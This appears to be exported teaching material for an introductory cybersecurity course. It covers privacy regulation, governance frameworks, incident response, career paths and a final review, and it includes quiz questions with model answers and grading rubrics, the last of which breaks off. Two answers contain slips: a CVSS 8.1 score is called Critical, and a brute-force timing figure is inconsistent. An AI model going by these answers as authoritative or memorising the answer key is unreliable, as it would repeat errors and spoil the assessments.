lecture_notes.introduction: Privacy and data protection have moved from niche compliance concerns to central pillars of cybersecurity strategy. The explosion of data collection by organizations, combined with high-profile breaches exposing millions of personal records, has driven a global wave of privacy regulation. The European Union's General Data Protection Regulation set a new standard that has influenced legislation worldwide, from the California Consumer Privacy Act to Brazil's LGPD to Japan's APPI amendments. For cybersecurity professionals, understanding privacy is not optional: security controls must be designed and operated with privacy requirements in mind. Data minimization, purpose limitation, consent management, breach notification, and the right to erasure all have direct implications for security architecture and incident response. In this session we examine privacy from both a regulatory and technical perspective. We begin with the foundational principles of data privacy, then survey the major regulatory frameworks that cybersecurity professionals must understand. We examine data classification schemes that categorize information by sensitivity and handling requirements, and we discuss the technical controls that enforce privacy including encryption, tokenization, data masking, anonymization, and pseudonymization. The session concludes with a discussion of privacy by design, the principle that privacy protections should be built into systems from the beginning rather than bolted on after the fact.
key_concepts: Data privacy vs data security: privacy governs how personal data should be collected, used, and shared; security protects data from unauthorized access
Privacy principles: data minimization, purpose limitation, consent, transparency, accuracy, storage limitation, and accountability
GDPR requirements: lawful basis for processing, data subject rights, Data Protection Officer, 72-hour breach notification, and significant fines
CCPA and state privacy laws: consumer rights to know, delete, and opt out of data sales, with expanding requirements under CPRA
HIPAA: protected health information safeguards, minimum necessary standard, Business Associate Agreements, and breach notification rules
Data classification: public, internal, confidential, and restricted levels with specific handling, storage, and disposal requirements for each
Encryption for privacy: data at rest (full disk, database-level, column-level), data in transit (TLS), and data in use (homomorphic encryption concepts)
Anonymization vs pseudonymization: anonymization removes all identifying information irreversibly; pseudonymization replaces identifiers with tokens that can be reversed with a key
Data Loss Prevention: monitoring and controlling the movement of sensitive data across endpoints, networks, and cloud services
Privacy by design: embedding privacy protections into system architecture from the initial design phase rather than adding them retroactively
lecture_notes.demonstration: Hands-on exercise configuring Data Loss Prevention rules to detect and block transmission of credit card numbers, social security numbers, and medical record numbers via email and web uploads, followed by testing with sample data to verify rule effectiveness
setup_requirements: DLP solution configured in the lab environment
Sample datasets containing synthetic PII for testing
Data classification policy template
GDPR compliance checklist

review.value: Lawful basis required for all processing. Data subjects have rights to access, rectification, erasure, portability, and objection. Breach notification to authority within 72 hours. Fines up to 4% of global annual revenue or 20 million euros.

Public: freely available. Internal: for employees only, low impact if disclosed. Confidential: limited access, significant impact if disclosed. Restricted: strictly controlled, severe impact if disclosed. Each level prescribes specific encryption, storage, transmission, and disposal requirements.

Anonymization: irreversible removal of identifying information. Anonymized data is no longer personal data under GDPR. Pseudonymization: reversible replacement with tokens. Still considered personal data under GDPR but qualifies for certain processing allowances.

DLP systems monitor three vectors: data at rest (scanning file servers and databases), data in motion (inspecting network traffic and email), and data in use (monitoring endpoint activity like copy-paste and screen capture). Policies define sensitive data patterns and enforcement actions.

learning_objectives: Differentiate between security policies, standards, guidelines, and procedures
Compare major cybersecurity frameworks including NIST CSF, ISO 27001, and CIS Controls
Develop a security policy document for a specific organizational context
Explain the role of governance, risk management, and compliance in cybersecurity
readings: CompTIA Security+ Study Guide Ch. 12: Governance, Risk, and Compliance
NIST Cybersecurity Framework 2.0 Core Document
CIS Critical Security Controls v8 Overview

lecture_notes.introduction: Technology alone cannot secure an organization. Without policies that define what should be protected, standards that specify how to protect it, and governance structures that ensure compliance and accountability, even the most advanced security tools are deployed inconsistently and ineffectively. Security policies are the authoritative documents that translate business objectives and risk tolerance into actionable security requirements. They are the bridge between executive leadership, which sets the strategic direction, and technical teams, which implement the controls. In this session we examine the hierarchy of security governance documents from high-level policies through standards, guidelines, and procedures, understanding the role each plays in an effective security program. We then survey the major cybersecurity frameworks that organizations use to structure their security efforts. The NIST Cybersecurity Framework provides a flexible, risk-based approach organized around five core functions: Identify, Protect, Detect, Respond, and Recover. ISO 27001 provides a certifiable information security management system. The CIS Critical Security Controls provide a prioritized set of actions that address the most common attack vectors. We discuss how organizations select, adopt, and implement these frameworks, and how compliance requirements from regulations like HIPAA, PCI-DSS, and SOX map to framework controls.
key_concepts: Policy hierarchy: policies set high-level requirements, standards define specific technical requirements, guidelines provide recommendations, procedures detail step-by-step instructions
Acceptable Use Policy: defines what employees may and may not do with organizational IT resources, including personal use, social media, and data handling
NIST Cybersecurity Framework 2.0: Govern, Identify, Protect, Detect, Respond, Recover functions with categories and subcategories of security outcomes
ISO 27001: requirements for establishing, implementing, maintaining, and continually improving an Information Security Management System
CIS Critical Security Controls v8: 18 prioritized controls organized into Implementation Groups based on organizational maturity and risk profile
Risk management process: identify assets, identify threats and vulnerabilities, assess likelihood and impact, determine risk level, select and implement controls
Risk treatment options: mitigate (reduce risk with controls), transfer (insurance or outsourcing), accept (acknowledge and document), avoid (eliminate the risk source)
Compliance vs security: compliance is meeting minimum regulatory requirements; security is managing actual risk. Compliance does not guarantee security.
Security awareness training: transforming policy requirements into employee behavior through regular training, phishing simulations, and positive reinforcement
Third-party risk management: assessing the security posture of vendors and partners through questionnaires, audits, SOC 2 reports, and contractual requirements
lecture_notes.demonstration: Workshop-style exercise where student teams develop an Acceptable Use Policy and an Incident Response Policy for a fictional mid-size healthcare company, using NIST CSF as the organizing framework and mapping policy requirements to specific CIS Controls
setup_requirements: Security policy templates and examples
NIST CSF 2.0 reference materials
CIS Controls v8 mapping spreadsheet
HIPAA security rule summary for healthcare context

review.value: Policy: All data must be encrypted in transit (what). Standard: TLS 1.3 must be used for all web traffic (how, specifically). Procedure: Step-by-step instructions for configuring TLS 1.3 on Apache web servers (how, step by step). Guideline: TLS 1.3 is recommended; TLS 1.2 is acceptable with approved cipher suites (recommendation).

Govern: establish and manage cybersecurity strategy. Identify: understand assets, risks, and business context. Protect: implement safeguards. Detect: identify security events. Respond: take action on detected events. Recover: restore capabilities. These functions apply to all organizations regardless of size.

Mitigate: install a firewall to reduce network attack risk. Transfer: purchase cyber insurance to shift financial impact. Accept: document that the risk of a cosmetic website defacement is within tolerance. Avoid: discontinue a high-risk service that provides marginal business value.

Organizations are only as secure as their weakest vendor. The Target breach originated through an HVAC vendor. Third-party risk management requires due diligence before engagement, contractual security requirements, ongoing monitoring, and right-to-audit clauses.

learning_objectives: Describe the six phases of the NIST incident response lifecycle
Identify key roles and responsibilities in an incident response team
Develop an incident response plan for common attack scenarios
Explain the importance of evidence preservation and chain of custody
readings: CompTIA Security+ Study Guide Ch. 13: Incident Response
NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide
SANS Incident Handler's Handbook

lecture_notes.introduction: Every organization will experience a security incident. The question is not if but when, and the difference between a manageable disruption and a catastrophic breach often comes down to how prepared the organization is to respond. Incident response is the organized approach to addressing and managing the aftermath of a security breach or cyberattack, with the goal of limiting damage, reducing recovery time and costs, and preventing recurrence. In this session we examine the NIST incident response lifecycle, which provides a structured framework for handling security incidents through six phases: Preparation, Detection and Analysis, Containment, Eradication, Recovery, and Post-Incident Activity. We discuss the composition and roles of an incident response team, from the incident commander who coordinates the response to the forensic analysts who preserve and analyze evidence to the communications team that manages stakeholder notification. We examine common incident scenarios including ransomware, data breaches, insider threats, and denial-of-service attacks, discussing the specific response procedures for each. We also address the legal and regulatory dimensions of incident response, including evidence preservation, chain of custody requirements, breach notification obligations, and law enforcement coordination. The session provides a practical foundation that will be expanded in advanced incident response courses later in the program.
key_concepts: NIST IR lifecycle: Preparation, Detection and Analysis, Containment, Eradication, Recovery, Post-Incident Activity (Lessons Learned)
Preparation: incident response plan, team formation, communication plans, tools and resources, training and exercises
Detection and analysis: SIEM alerts, IDS notifications, user reports, log analysis, and determining incident scope and severity
Containment strategies: short-term (isolate affected systems), long-term (rebuild on clean systems), evidence preservation during containment
Eradication: removing the threat from the environment by eliminating malware, closing vulnerabilities, and revoking compromised credentials
Recovery: restoring systems to normal operation, validating system integrity, monitoring for re-infection, and phased return to production
Post-incident activity: lessons learned meetings, documentation, process improvements, and updating detection rules and response procedures
Chain of custody: documenting who handled evidence, when, and what they did with it to ensure admissibility in legal proceedings
Incident classification: severity levels from informational through critical, with defined response times and escalation procedures for each
Communication during incidents: internal escalation paths, executive briefings, customer notification, regulatory reporting, and media management
lecture_notes.demonstration: Tabletop exercise simulating a ransomware incident: students are assigned roles on the incident response team and must work through detection, containment, eradication, and recovery phases while the instructor introduces complications such as backup encryption, media inquiries, and regulatory notification deadlines
setup_requirements: Incident response tabletop exercise scenario packet
Role cards for incident response team members
Incident response plan template
Evidence collection and chain of custody forms

review.value: Preparation: have a plan before incidents happen. Detection: identify and validate the incident. Containment: stop the bleeding without destroying evidence. Eradication: remove the threat completely. Recovery: restore and verify. Lessons Learned: improve for next time.

Every piece of evidence must have a documented chain showing who collected it, when, how it was transported, where it was stored, and who accessed it. Gaps in chain of custody can render evidence inadmissible in legal proceedings.

Short-term: immediately isolate the compromised system from the network to prevent spread. Long-term: rebuild affected systems on clean media while preserving the compromised system as evidence. The choice between shutting down and isolating depends on the need to preserve volatile evidence.

Conduct within two weeks of incident closure. Document: what happened, how was it detected, what worked well, what could be improved, and what specific changes will be made. Without lessons learned, the same incident will happen again.

learning_objectives: Map cybersecurity career paths from entry level through executive leadership
Evaluate major industry certifications and their career relevance
Develop a personal career development plan with specific milestones
Identify continuing education and professional development resources
readings: CompTIA Cybersecurity Career Pathway Guide
ISC2 Career Guide for Cybersecurity Professionals
CyberSeek Interactive Career Pathway Map

lecture_notes.introduction: With the foundational knowledge from this course established, it is time to look ahead at where a cybersecurity career can take you. The cybersecurity profession offers an extraordinary range of career paths, from deeply technical roles like penetration tester and malware analyst to strategic leadership roles like Chief Information Security Officer and security architect. The field also offers remarkable job security and competitive compensation, driven by the persistent talent shortage and the increasing importance of cybersecurity to every organization. In this session we explore the major career tracks within cybersecurity, examining the knowledge, skills, and certifications expected at each level. We discuss the distinction between the blue team defensive path through SOC analyst, incident responder, and threat hunter, the red team offensive path through penetration tester, exploit developer, and red team operator, and the governance path through security analyst, compliance manager, and CISO. We examine the major industry certifications, understanding what each validates and where it fits in a career progression. CompTIA Security+ provides the entry-level foundation, CISSP validates broad security management knowledge, OSCP proves hands-on penetration testing ability, and specialized certifications like GIAC offerings cover areas from forensics to cloud security. We also discuss the importance of continuous learning, community engagement, and practical experience through CTF competitions, home labs, and open-source contributions.
key_concepts: Blue team career path: SOC Analyst Tier 1 through Tier 3, Incident Responder, Threat Hunter, Detection Engineer, Security Architect
Red team career path: Junior Penetration Tester, Senior Penetration Tester, Red Team Operator, Exploit Developer, Red Team Lead
GRC career path: Security Analyst, Compliance Analyst, Risk Manager, Security Manager, CISO
Entry-level certifications: CompTIA Security+, CompTIA CySA+, ISC2 CC, and their role as hiring prerequisites
Mid-career certifications: CISSP, OSCP, CISM, CCSP, and what each validates
Specialized certifications: GIAC GCIH, GREM, GCFE for specific domains like incident handling, malware analysis, and forensics
Salary expectations: entry-level 60-80K, mid-career 90-140K, senior and leadership 150-300K depending on role and location
Building experience: CTF competitions, home labs, open-source tool contributions, bug bounties, and volunteer security work
Professional communities: OWASP, ISC2 local chapters, DEF CON, BSides conferences, and online communities like r/netsec
Continuing education: staying current through threat intelligence feeds, security blogs, podcasts, and vendor training
lecture_notes.demonstration: Interactive exploration of the CyberSeek career pathway tool, mapping roles from entry level through advanced positions with salary data, certification requirements, and demand metrics, followed by a career planning workshop where students create a personalized five-year development plan
setup_requirements: CyberSeek.org career pathway tool access
Career development plan template
Certification comparison matrix handout
Resume and portfolio building guidelines

review.value: The most widely recognized entry-level cybersecurity certification. Validates foundational knowledge across all security domains. DoD 8570 approved for Information Assurance Technician Level II. Often required or preferred for entry-level security positions.

Certified Information Systems Security Professional. Requires five years of experience across two of eight domains. Validates broad security management knowledge. Often required for senior security roles and management positions. Gold standard of the industry.

Offensive Security Certified Professional. 24-hour hands-on practical exam requiring exploitation of machines in a lab environment. The most respected certification for penetration testers. Proves you can do the work, not just answer questions about it.

Year 1-2: Security+ certification, SOC analyst or help desk role, build home lab. Year 3-4: Specialize (CySA+, OSCP, or CCSP), move to mid-level role. Year 5+: CISSP or CISM, pursue leadership or deep technical specialization. Continuous: CTFs, conferences, community engagement.

learning_objectives: Synthesize cybersecurity concepts across all course modules into a cohesive understanding
Apply cybersecurity principles to analyze complex real-world scenarios
Demonstrate readiness for advanced cybersecurity coursework
Evaluate personal learning achievements and identify areas for further study
readings: Review all course materials and lecture notes
CompTIA Security+ Study Guide review chapters
Course summary and final exam preparation guide

lecture_notes.introduction: This final session brings together all the concepts, principles, and practical knowledge covered throughout the semester into a comprehensive review. Over the past fourteen weeks, you have built a foundation in cybersecurity that spans from the fundamental principles of the CIA triad through the technical details of network security, malware defense, and web application security, to the strategic considerations of privacy, governance, and incident response. This breadth of knowledge is what distinguishes a cybersecurity professional from a specialist in a single domain: the ability to see how all the pieces fit together and to make informed decisions about where to invest limited security resources for maximum effect. In this session we revisit the key themes and concepts from each module, connecting them into a coherent security framework. We work through complex scenarios that require applying knowledge from multiple modules simultaneously, as real-world security challenges never fit neatly into a single category. We discuss the final project presentations, review the key points that will be assessed in the final examination, and look ahead to the courses that build on this foundation: Network Fundamentals, Operating Systems Security, and Programming for Security. This course has given you the vocabulary, the conceptual framework, and the foundational knowledge to begin your journey in cybersecurity. The advanced courses in the program will deepen and specialize this knowledge, and the career awaiting you on the other side is both challenging and deeply rewarding.
key_concepts: CIA triad as the organizing principle for all security decisions: every control maps to confidentiality, integrity, or availability
Defense in depth applied across all domains: layering controls at network, endpoint, application, data, and human layers
Risk-based thinking: prioritizing security investments based on asset value, threat likelihood, and potential impact
The human element: social engineering remains the most effective attack vector and security culture is the most effective defense
Authentication as the foundation of access control: the evolution from passwords to MFA to passwordless authentication
Network security architecture: firewalls, IDS/IPS, segmentation, VPNs, and zero trust as complementary controls
Malware defense requires multiple layers: email filtering, endpoint protection, behavioral analysis, and application control
Web application security: input validation, output encoding, and the OWASP Top 10 as a prioritized vulnerability checklist
Governance and compliance: frameworks like NIST CSF provide structure, while regulations create legal obligations
Incident response preparedness: having a plan, a trained team, and tested procedures before an incident occurs
lecture_notes.demonstration: Capstone scenario exercise: students analyze a complex breach case study that spans multiple domains covered in the course, identifying the initial access vector, the vulnerabilities exploited, the security controls that failed, the incident response actions taken, and the policy and technical improvements that should be implemented
setup_requirements: Comprehensive breach case study packet
Course concept map and review guide
Final exam preparation materials
Self-assessment rubric for learning objectives

review.value: Security is not a product or a single technology; it is a process that combines people, policies, and technology in a risk-based framework. Every concept in this course connects to others: encryption enables confidentiality, access control enforces authorization, monitoring enables detection, and incident response limits damage.

The goal of cybersecurity is not to achieve perfect security, which is impossible, but to manage risk to an acceptable level through a combination of preventive, detective, and corrective controls guided by an understanding of the threat landscape and business context.

CY102 Network Fundamentals deepens network security knowledge. CY103 Operating Systems Security teaches system-level defense. CS110 Programming for Security builds automation skills. MATH210 Applied Mathematics provides the mathematical foundation for cryptography.

The final examination will include scenario-based questions requiring application of concepts from multiple modules, a network diagram security analysis, an incident response plan development exercise, and a policy evaluation component.

quizzes.topic: Cybersecurity Foundations, CIA Triad, and Threat Landscape

questions.question: A company stores customer medical records in a database. An attacker modifies several records without detection. Which element of the CIA triad has been violated, and what specific controls would best prevent and detect this type of attack?
questions.answer: Integrity has been violated. Prevention controls: implement cryptographic hashing (HMAC-SHA256) on database records with periodic integrity checks, use database activity monitoring to log all write operations, enforce access controls so only authorized applications can modify records, and implement change management requiring approval for bulk modifications. Detection controls: database activity monitoring with alerting on unauthorized modifications, file integrity monitoring, and regular comparison of record hashes against a trusted baseline. Additionally, implementing separation of duties ensures that no single individual can both modify records and approve changes.

rubric.key: Correctly identifies Integrity violation
Proposes appropriate prevention controls with technical detail
Proposes appropriate detection controls

questions.question: Map the following attack scenario to the Cyber Kill Chain phases and identify at which phase each defense would be most effective: An attacker scrapes employee LinkedIn profiles, crafts a spear-phishing email with a malicious PDF attachment, the PDF exploits an Adobe Reader vulnerability to install a Remote Access Trojan, which connects to a command-and-control server, and eventually exfiltrates the company's trade secrets.
questions.answer: Reconnaissance: LinkedIn scraping. Defense: limit public employee information, social media policy. Weaponization: Crafting the malicious PDF. Defense: threat intelligence sharing to identify tools used. Delivery: Sending the spear-phishing email. Defense: email gateway filtering, SPF/DKIM/DMARC, user awareness training. Exploitation: Adobe Reader vulnerability triggered. Defense: patch management to update Adobe Reader, application sandboxing. Installation: RAT installed on victim machine. Defense: endpoint detection and response, application whitelisting. Command and Control: RAT connects to C2 server. Defense: DNS filtering, network monitoring for beaconing patterns, egress firewall rules. Actions on Objectives: Trade secret exfiltration. Defense: DLP, network traffic analysis for large outbound transfers, data classification and access controls.

rubric.key: Correctly maps all seven kill chain phases
Identifies appropriate defense for each phase
Demonstrates understanding that defense can break the chain at any phase

questions.question: Explain the difference between a vulnerability, a threat, and a risk using a concrete example involving a web application. Then calculate the qualitative risk level given: the vulnerability has a CVSS score of 8.1, the threat actor is a financially motivated criminal group, and the asset contains payment card data for 50,000 customers.
questions.answer: Vulnerability: The web application has an unpatched SQL injection flaw (CVSS 8.1 Critical). This is a weakness that could be exploited. Threat: A financially motivated criminal group actively scanning for SQL injection vulnerabilities in e-commerce sites. This is the actor with capability and intent to exploit the vulnerability. Risk: The probability of the threat actor exploiting the SQL injection to steal 50,000 payment card records, considering the high CVSS score, active threat, and valuable asset. Qualitative risk: Critical/Very High. Likelihood is High because the vulnerability is severe, remotely exploitable, and the threat actor is active and motivated. Impact is High because PCI-DSS fines, breach notification costs, credit monitoring for 50,000 customers, and reputational damage. Risk = High Likelihood x High Impact = Critical Risk. Requires immediate remediation.

rubric.key: Correct definitions with concrete examples
Appropriate risk assessment methodology
Justified risk level with impact and likelihood reasoning

questions.question: A CEO receives an urgent voicemail from what appears to be the company's bank, asking them to call back immediately to verify a suspicious wire transfer. The callback number goes to a spoofed voice system. Identify the social engineering technique, the psychological principles being exploited, and describe three organizational controls that would mitigate this attack.
questions.answer: Technique: Vishing (voice phishing) combined with pretexting (fabricating the scenario of a suspicious wire transfer). Psychological principles: Authority (impersonating the bank, a trusted institution), Urgency (demanding immediate callback to prevent supposed fraud), and Fear (the threat of financial loss if they do not act quickly). Organizational controls: (1) Callback verification policy requiring employees to call financial institutions only using numbers from official documentation or the institution's website, never from the message itself. (2) Dual authorization requirement for all wire transfers, ensuring no single individual can initiate or verify a transfer alone. (3) Regular vishing awareness training with simulated attacks to build recognition and proper response habits. Additional: Implement voice call authentication technology and maintain a list of verified contact numbers for all financial partners.

rubric.key: Correctly identifies vishing and pretexting
Identifies relevant psychological principles with explanation
Three substantive organizational controls

quizzes.topic: Authentication, Password Security, and Network Security

questions.question: Explain why a system should use bcrypt or Argon2 instead of plain SHA-256 for storing user passwords, even though SHA-256 is a cryptographically secure hash function. Include specific attack scenarios and quantitative comparisons.
questions.answer: SHA-256 is designed to be fast, computing billions of hashes per second on modern GPUs. This speed is a vulnerability for password storage because attackers can attempt massive numbers of guesses rapidly. A modern GPU can compute approximately 10 billion SHA-256 hashes per second, meaning a 6-character alphanumeric password is cracked in under a second. bcrypt and Argon2 are deliberately slow through key stretching. bcrypt with a work factor of 12 computes approximately 3-4 hashes per second per core. Argon2id additionally requires configurable memory (e.g., 64MB per hash), defeating GPU parallelization since GPUs have limited memory per core. Both include a unique random salt per password, preventing precomputed rainbow table attacks. With bcrypt at 4 hashes/second, the same 6-character password would take approximately 54 billion seconds to brute force. Argon2 is recommended by OWASP for new applications because of its resistance to both GPU and ASIC-based cracking through memory-hardness.

rubric.key: Explains SHA-256 speed as a specific vulnerability with quantitative comparison
Describes salting, key stretching, and memory-hardness mechanisms
Provides meaningful quantitative comparison showing practical impact

questions.question: A hospital needs to ensure that nurses can view patient vitals but cannot modify treatment plans, while doctors can view and modify both. Which access control model is most appropriate, how would you implement it, and what additional authentication controls would you recommend for this healthcare environment?
questions.answer: Role-Based Access Control (RBAC) is most appropriate. Implementation: Create a Nurse role with read-only permissions on patient vitals and treatment plans. Create a Doctor role with read/write permissions on both vitals and treatment plans. Assign users to roles based on verified job function through HR integration. Use ABAC (Attribute-Based Access Control) as a supplement for contextual rules such as restricting access to only patients assigned to that nurse's unit. Additional authentication controls for healthcare: Mandatory MFA using badge plus PIN at clinical workstations. Proximity-based auto-logout when the badge is removed from the reader. Biometric authentication for medication dispensing systems. Break-glass emergency access with mandatory post-access audit review. All access must be logged per HIPAA audit requirements with minimum 6-year retention.

rubric.key: Identifies RBAC with correct role and permission design
Additional contextual controls (ABAC supplement or equivalent)
Appropriate healthcare-specific authentication controls

questions.question: Draw and describe a network security architecture for a small e-commerce company that includes a web server, application server, and database server. Include all security devices, network segments, and explain the traffic flow rules between each segment.
questions.answer: Architecture: Three-tier with four network segments. Segment 1 - Internet-facing: External firewall (NGFW) facing the internet with IPS enabled, allowing only ports 80 and 443 inbound.
